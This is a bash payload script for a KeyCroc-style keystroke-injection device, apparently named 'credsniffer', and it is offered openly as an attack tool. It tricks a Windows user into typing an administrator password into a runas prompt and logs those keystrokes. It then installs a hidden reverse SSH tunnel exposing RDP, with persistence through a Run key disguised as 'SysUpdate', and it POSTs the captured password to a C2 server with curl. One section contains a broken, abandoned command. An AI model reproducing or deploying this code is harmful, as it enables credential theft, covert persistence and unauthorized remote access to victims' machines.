####################Logging##################################################
LOG_FILE="/root/loot/credsniffer_$(date +%Y%m%d_%H%M%S).log"
mkdir -p /root/loot

log() {
    local level="$1"; shift
    echo "[$(date +%H:%M:%S)] [$level] $*" | tee -a "$LOG_FILE"
}

log INFO "=== credsniffer payload started ==="
log INFO "C2_IP=$C2_IP C2_PORT=$C2_PORT C2_SSH_USER=$C2_SSH_USER"

####################Trigger & Clean Up#######################################
# IMPORTANT: Only deploy this on a Windows machine at login screen.
# If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
# Uncomment one trigger strategy:

# Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)
MATCH \[ENTER\]

# Strategy 2: Safer — only fires during first 30 seconds after boot (uncomment to use)
# This gives you time to unplug if you realize it's plugged into the wrong machine
# MATCH \[ENTER\]
# if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi

log INFO "STEP 1: Trigger fired — cleaning old loot"
rm -f /root/loot/win-pass*

########################Capture Admin Credentials via runas##################
# runas /user:Administrator opens a console password prompt regardless of UAC
# policy or Group Policy — it always prompts, even on domain/org machines.
# SAVEKEYS captures the password typed into that console window.
#
# Set RUNAS_USER above. On domain PCs use DOMAIN\\Administrator.
# Find domain with: whoami (output is DOMAIN\username)

log INFO "STEP 2: Sending HID — opening Run dialog for runas password prompt"
Q DELAY 1000

# Open Run dialog and launch runas — spawns a console asking for the password
Q GUI r
Q DELAY 600
Q STRING runas /user:$RUNAS_USER cmd
Q ENTER
Q DELAY 1200

# Start capturing BEFORE the user types — console is now waiting for password
# NEXT 50 is enough: password (up to ~40 chars) + ENTER
# Capture happens now as user types into the runas console password field
log INFO "STEP 3: Starting SAVEKEYS capture (50 keys, background)"
SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
echo $! > /tmp/savekeys.pid

# Poll for capture completion — UAC credential entry happens here
log INFO "STEP 4: Polling for SAVEKEYS output (max 30s)..."
for i in {1..60}; do
    [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
    sleep 0.5
done

# Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
if [ ! -f /root/loot/win-pass.txt ]; then
    log ERROR "STEP 4 FAILED: No credential captured — user may have dismissed the runas console, or RUNAS_USER ($RUNAS_USER) does not exist on this machine."
    exit 1
fi
log INFO "STEP 4 OK: Credential file captured ($(wc -c < /root/loot/win-pass.txt) bytes)"

#####################Persistence via Reverse SSH Tunnel######################
# OpenSSH CLIENT ships with Windows 10 1809+ — available to all users, no admin.
# The target connects OUT to C2; no inbound firewall rule or new service needed.
# HID-only mode (no RNDIS) — no USB network adapter visible, no notifications.

log INFO "STEP 5: Sending HID — injecting SSH persistence"
Q DELAY 3000

# Use wscript.exe to run a hidden VBScript wrapper so the Run dialog
# itself is never visible (avoids the brief GUI r flash)
Q GUI r
Q DELAY 600
Q STRING wscript //nologo //e:vbscript
Q ENTER
Q DELAY 800

# Actually, simpler: use a scheduled task created via cmd, which we can
# invoke from the Run dialog with a fully hidden window style.
# First close that, use a different approach:
Q ESC
Q DELAY 300

# Create a one-shot temp batch file and run it hidden via wscript
# This avoids any visible window flash entirely
Q GUI r
Q DELAY 600
Q STRING cmd /c "echo Set o=CreateObject("WScript.Shell"):o.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "^&{$t="""ENCODED_BELOW"""} > %TEMP%\s.vbs && wscript //nologo %TEMP%\s.vbs"
Q ENTER

# Simpler and more reliable — just accept the brief Run dialog, it closes fast:
Q GUI r
Q DELAY 600
Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
Q ENTER
Q DELAY 1200

# Create .ssh dir, write known_hosts (prevents StrictHostKeyChecking prompt/fail)
Q STRING "$d=\"$env:USERPROFILE\.ssh\"; New-Item -Force -ItemType Directory $d | Out-Null; Add-Content \"$d\known_hosts\" '$C2_HOSTKEY'"
Q ENTER
Q DELAY 300

# Decode and write tunnel_id private key, lock permissions (required by OpenSSH)
Q STRING "[IO.File]::WriteAllBytes(\"$env:USERPROFILE\.ssh\tunnel_id\",[Convert]::FromBase64String('$TUNNEL_KEY_B64')); icacls \"$env:USERPROFILE\.ssh\tunnel_id\" /inheritance:r /grant \"\$env:USERNAME`:R\" | Out-Null"
Q ENTER
Q DELAY 300

# Write HKCU Run key for persistence — fires on every logon, no admin needed
Q STRING "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value ('ssh.exe -N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i \"%USERPROFILE%\.ssh\tunnel_id\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}')"
Q ENTER
Q DELAY 300

# Start tunnel immediately without waiting for reboot
Q STRING "Start-Process ssh.exe -WindowStyle Hidden -ArgumentList \"-N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i `\`\"$env:USERPROFILE\.ssh\tunnel_id`\`\" -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}\""
Q ENTER
Q DELAY 500
Q STRING exit
Q ENTER
log INFO "STEP 5 OK: Persistence HID commands sent"

# Attacker: RDP to target via C2 tunnel with:  xfreerdp /v:localhost:${REVERSE_PORT}

#####################Exfiltrating Credentials###############################
# curl uses KeyCroc's own WiFi interface — no RNDIS, no USB NIC, no popups.
log INFO "STEP 6: Exfiltrating keylog to C2 at ${C2_IP}:${C2_PORT}"

CLEAN_PASS=$(curl -s -w "\n__HTTP_%{http_code}" -X POST "http://${C2_IP}:${C2_PORT}/keylog" \
     --data-binary @/root/loot/win-pass.txt 2>>"$LOG_FILE")

HTTP_CODE=$(echo "$CLEAN_PASS" | grep '__HTTP_' | sed 's/__HTTP_//')
CLEAN_PASS=$(echo "$CLEAN_PASS" | grep -v '__HTTP_')

if [ "$HTTP_CODE" = "200" ]; then
    log INFO "STEP 6 OK: C2 responded 200 — cleaned password received"
else
    log ERROR "STEP 6 FAILED: C2 HTTP response code=${HTTP_CODE} (empty = no route to host)"
fi

log INFO "C2 returned: ${CLEAN_PASS}"
echo "[*] C2 returned cleaned password: ${CLEAN_PASS}"

Q DELAY 1000
log INFO "=== credsniffer payload finished — log at $LOG_FILE ==="
